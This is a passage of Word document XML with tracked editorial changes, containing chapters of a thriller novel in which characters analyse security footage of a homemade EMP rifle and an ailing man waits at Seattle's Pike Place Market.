          <w:rPrChange w:id="2461" w:author="TextVet" w:date="2016-03-23T15:46:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>this</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screen ran a clip of the other gunman, the one with the suppressor, trapped in the stockroom. He lifted a keycard to the reader, when it appeared to jump from his hand. After picking it up and waving it again, the card appeared broken.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“Whatever that gun is shooting, it’s doing it </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>through the wall</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. And then I found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loaded a segment from the parking lot, where the gunman with the silencer talked to the driver of the Lincoln Navigator, visible only as a silhouette in the driver</w:t>
      </w:r>
      <w:ins w:id="2462" w:author="TextVet" w:date="2016-03-23T15:48:00Z">
        <w:r w:rsidR="005E1BF4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2463" w:author="TextVet" w:date="2016-03-23T15:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005E1BF4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">’s </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">side window. He played the clip up to the point </w:t>
      </w:r>
      <w:del w:id="2464" w:author="TextVet" w:date="2016-03-23T15:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002702DB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">at </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wh</w:t>
      </w:r>
      <w:ins w:id="2465" w:author="TextVet" w:date="2016-03-23T15:49:00Z">
        <w:r w:rsidR="002702DB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ere</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2466" w:author="TextVet" w:date="2016-03-23T15:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002702DB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ich</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the gunman dropped his cellphone. Stepping frame by frame, Roger saw sparks erupt from the phone.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concluded, “And then I was like, ‘Holy fucking shit!’”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shook his head. “I do not follow.”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explained, “Okay, it’s like, you know how in StarCraft, the Ghost can shoot an EMP shockwave that knocks out Protoss shields?”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stared at him blankly.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there’s this old game called System Shock 2,” Roger continued, “that has an electromagnetic pulse rifle. You shoot it at robots and cyborgs</w:t>
      </w:r>
      <w:ins w:id="2467" w:author="TextVet" w:date="2016-03-23T15:49:00Z">
        <w:r w:rsidR="00F36A77">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2468" w:author="TextVet" w:date="2016-03-23T15:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F36A77">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it fries their circuitry and kills them instantly. But it doesn’t hurt humans</w:t>
      </w:r>
      <w:ins w:id="2469" w:author="TextVet" w:date="2016-03-23T15:50:00Z">
        <w:r w:rsidR="005B7812">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2470" w:author="TextVet" w:date="2016-03-23T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005B7812">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471" w:author="TextVet" w:date="2016-03-23T15:50:00Z">
        <w:r w:rsidR="005B7812">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2472" w:author="TextVet" w:date="2016-03-23T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005B7812">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>O</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">nly things with </w:t>
      </w:r>
      <w:del w:id="2473" w:author="TextVet" w:date="2016-03-23T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005B7812">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>microchip</w:t>
      </w:r>
      <w:ins w:id="2474" w:author="TextVet" w:date="2016-03-23T15:50:00Z">
        <w:r w:rsidR="005B7812">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didn’t stir. “An electromagnetic pulse rifle?”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said Roger. “An EMP or Magpulse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raised his large gray eyebrows. “For shooting robots and ‘cyborgs’ in computer game?”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yeah,” said Roger. “I know, it sounds ridiculous, but I’m telling you, it works </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exactly</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> like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old is it?” Passinsky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old is what?” asked Roger. “The EMP rifle? I have no idea. I didn’t even know it actually exists…”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The computer game.”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looked perplexed. “How old is System Shock 2? Hell</w:t>
      </w:r>
      <w:ins w:id="2475" w:author="TextVet" w:date="2016-03-23T15:52:00Z">
        <w:r w:rsidR="0067224F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2476" w:author="TextVet" w:date="2016-03-23T15:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0067224F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, I don’t know</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2477" w:author="TextVet" w:date="2016-03-23T15:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0067224F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. F</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2478" w:author="TextVet" w:date="2016-03-23T15:52:00Z">
        <w:r w:rsidR="0067224F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>f</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ifteen, twenty years. It has </w:t>
      </w:r>
      <w:ins w:id="2479" w:author="TextVet" w:date="2016-03-23T15:55:00Z">
        <w:r w:rsidR="00A0600B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2480" w:author="TextVet" w:date="2016-03-23T15:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A0600B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>this whole</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> nineties cyberpunk sci-fi dystopia feel</w:t>
      </w:r>
      <w:del w:id="2481" w:author="TextVet" w:date="2016-03-23T15:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F91086">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to it</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2482" w:author="TextVet" w:date="2016-03-23T15:54:00Z">
        <w:r w:rsidR="00661347">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2483" w:author="TextVet" w:date="2016-03-23T15:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00661347">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484" w:author="TextVet" w:date="2016-03-23T15:54:00Z">
        <w:r w:rsidR="00661347">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2485" w:author="TextVet" w:date="2016-03-23T15:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00661347">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>A</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ll retro and awesome. Of course, </w:t>
      </w:r>
      <w:del w:id="2486" w:author="TextVet" w:date="2016-03-23T15:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0067224F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">I guess </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>it wasn’t</w:t>
      </w:r>
      <w:del w:id="2487" w:author="TextVet" w:date="2016-03-23T15:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0067224F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> actually</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>retro</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> back then… Wh</w:t>
      </w:r>
      <w:ins w:id="2488" w:author="TextVet" w:date="2016-03-23T15:55:00Z">
        <w:r w:rsidR="00F91086">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>at about it</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2489" w:author="TextVet" w:date="2016-03-23T15:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F91086">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>y</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2490" w:author="TextVet" w:date="2016-03-23T15:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F91086">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> do you ask</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said it sounds ridiculous, to see a weapon from an old video game in your real world,” said Passinsky.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“Hey, I only know what I see on the screen.”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 is not so ridiculous,” </w:t>
      </w:r>
      <w:ins w:id="2491" w:author="TextVet" w:date="2016-03-23T15:56:00Z">
        <w:r w:rsidR="0065138D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>cautione</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2492" w:author="TextVet" w:date="2016-03-23T15:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0065138D">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 xml:space="preserve">d the elderly scientist. “When you live for many decades, you see many things that were once only fantasy become real. Somebody built that EMP rifle you see on screen there. An engineer. And </w:t>
      </w:r>
      <w:del w:id="2493" w:author="TextVet" w:date="2016-03-23T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C6396D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>engineers of today, fifteen or twenty years ago, were children playing video games.”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device is obviously homemade, or maybe a prototype that someone built by hand,” said Roger. “Here, </w:t>
      </w:r>
      <w:del w:id="2494" w:author="TextVet" w:date="2016-03-29T15:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F543B2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">take a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>look at this…” He shuffled through the footage until he found a clip of the geek dodging gunfire just outside the stockroom, then reuniting with his large scruffy friend in the adjoining hallway. “See how he’s looking over the parts of the gun to check for damage? It’s like he knows exactly how this thing works, down to the last transistor. And he’s so detailed and methodical about it… This thing is his baby. He made it himself. I’m sure of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Passinsky’s expression turned to steel. “Do you think you can find him with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do you mean?” asked Roger.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many men in this city, do you think, have the capability to build something like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felt a flash of admiration for the gruff old scientist. The guy might’ve been ancient and a total asshole of a boss, but he was indisputably brilliant. “Probably not too many, Doc. And he’d have his skills listed on LinkedIn. And he’d be a member of local Meetup groups for electronics. And he’d know folks in the Maker community and probably post on their forums. And there’s Ada’s Technical Books over on Broadway — I’m sure if I show his photo around…”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screen showed a clip of the hallway outside the cold storage room, just before the fight. The geeky man was wearing a stolen lab coat and pointing the pulse rifle at the leather-clad gunman. A moment later, the door to the cold storage room opened, and Tina emerged. Roger paused on the frame. The guy had turned to look at the door, and </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>at that moment the light from the doorway fell upon him. Roger set the image to full-screen. It showed the face of the man with the energy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“Whoever he is,” said Roger, “I bet I can find him. I know a few computer tricks.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>23</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Pike Place Market teemed</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> with tourists, locals, and seagulls alike, as the smell of fish and the music of street performers filled the air. Built on a steep slope overlooking Elliott Bay, the countless shops were constructed atop one another, connected by chaotic networks of stairs and ramps. Farmers set up fruit carts; artists hocked watercolor paintings; fishmongers threw salmon over the heads of cheering customers.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Mukhayev sat in a wicker patio chair at a small round table at an outdoor café, sipping tea and waiting.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tea was hot, black, and strong. He wasn’t supposed to indulge, but this one cup of tea wouldn’t kill him. It was simply a nod to the truth — and the truth, like the tea, was bitter. It would be ten years before Rosie would graduate college. His chances of seeing that happen were fifty-fifty. In however many years remained for him, his sole purpose was to secure her future, to at least partially rectify the tragedy he had made of her innocent young life. His business, with its secrecy and violence, unfortunately happened to be incredibly lucrative. Through it</w:t>
      </w:r>
      <w:ins w:id="2495" w:author="TextVet" w:date="2016-03-23T16:01:00Z">
        <w:r w:rsidR="006F1BEF">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he had caused his own damnation. And through it, he sought to earn some glimmer of redemption.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felt the caffein</w:t>
      </w:r>
      <w:del w:id="2496" w:author="TextVet" w:date="2016-03-23T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CB667B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:del w:id="2497" w:author="TextVet" w:date="2016-03-23T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B75003">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>d drink</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> begin </w:t>
      </w:r>
      <w:del w:id="2498" w:author="TextVet" w:date="2016-03-23T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B75003">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tak</w:t>
      </w:r>
      <w:ins w:id="2499" w:author="TextVet" w:date="2016-03-23T16:01:00Z">
        <w:r w:rsidR="00B75003">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2500" w:author="TextVet" w:date="2016-03-23T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B75003">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xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="2501" w:author="TextVet" w:date="2016-03-23T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003B4272">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">its </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>effect. His heart quickened. Ironic stuff, tea was — so soothing to the mind, yet so stressing to the body.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with the quickening came the pain. A sharp pinch stabbed his chest, like heartburn after a meal of needles. He pressed his hand to his sternum and winced. His head felt as though he had stood up too quickly. He made himself cough several times to get the blood flowing back to his head.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His fingers felt around in his pocket for his pills, searching for the beads of chewable aspirin mixed in among the hard round beta-blockers and the long oval statin tablets. He preferred to keep them jumbled in his pocket, outside their bottles. Bottles of </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">pills </w:t>
      </w:r>
      <w:ins w:id="2502" w:author="TextVet" w:date="2016-03-23T16:03:00Z">
        <w:r w:rsidR="00832465">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>rattled</w:t>
        </w:r>
      </w:ins>
